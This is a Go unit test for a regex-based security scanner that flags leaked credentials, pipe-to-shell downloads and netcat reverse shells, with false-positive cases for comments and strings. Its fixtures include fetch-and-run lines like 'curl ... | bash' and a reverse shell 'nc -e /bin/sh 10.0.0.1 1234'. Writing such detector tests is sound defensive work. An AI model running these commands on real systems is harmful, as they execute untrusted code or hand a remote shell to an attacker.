package security

import (
	"testing"
)

func TestRegexScanner_Scan(t *testing.T) {
	scanner := NewRegexScanner()

	tests := []struct {
		name        string
		content     string
		wantFinding string
	}{
		{
			name:        "Safe Content",
			content:     "fmt.Println(\"Hello World\")",
			wantFinding: "",
		},
		{
			name:        "AWS Key",
			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
			wantFinding: "AWS Access Key",
		},
		{
			name:        "GitHub Token",
			content:     "token = \"ghp_123456789012345678901234567890123456\"",
			wantFinding: "GitHub Token",
		},
		{
			name:        "Private Key",
			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
			wantFinding: "Private Key",
		},
		{
			name:        "Generic API Key",
			content:     "api_key = \"abc1234567890abc1234567890\"",
			wantFinding: "Generic API Token",
		},
		{
			name:        "Pipe to Shell - Direct",
			content:     "curl https://example.com/install.sh | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Pipe to Shell - Wget and Sh",
			content:     "wget -O - https://example.com/script | sh",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Pipe to Shell - Quoted URL",
			content:     "curl \"https://example.com/install.sh\" | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Pipe to Shell - Indirect (Chain)",
			content:     "curl https://example.com | grep 'install' | bash",
			wantFinding: "Pipe to Shell",
		},
		{
			name:        "Pipe to Shell - False Positive (Comment)",
			content:     "# curl https://example.com | bash",
			wantFinding: "",
		},
		{
			name:        "Pipe to Shell - False Positive (String)",
			content:     "echo \"Run: curl | bash\"",
			wantFinding: "",
		},
		{
			name:        "Pipe to Shell - False Positive (Unrelated)",
			content:     "curl https://example.com ; ls -la | bash",
			wantFinding: "",
		},
		{
			name:        "Pipe to Shell - False Positive (OR operator)",
			content:     "curl https://example.com || ls | bash",
			wantFinding: "",
		},
		{
			name:        "Reverse Shell - Netcat",
			content:     "nc -e /bin/sh 10.0.0.1 1234",
			wantFinding: "Reverse Shell",
		},
		{
			name:        "Reverse Shell - False Positive (Comment)",
			content:     "# nc -e /bin/sh",
			wantFinding: "",
		},
		{
			name:        "Reverse Shell - False Positive (String)",
			content:     "cmd = \"nc -e /bin/sh\"",
			wantFinding: "",
		},
		{
			name:        "Reverse Shell - False Positive (Unrelated)",
			content:     "nc 10.0.0.1 ; ls -e",
			wantFinding: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings, err := scanner.Scan(tt.content)
			if err != nil {
				t.Fatalf("Scan failed: %v", err)
			}

			if tt.wantFinding == "" {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			} else {
				if len(findings) == 0 {
					t.Errorf("Expected finding %q, got none", tt.wantFinding)
				} else {
					found := false
					for _, f := range findings {
						if f.Type == tt.wantFinding {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("Expected finding type %q, got %v", tt.wantFinding, findings)
					}
				}
			}
		})
	}
}
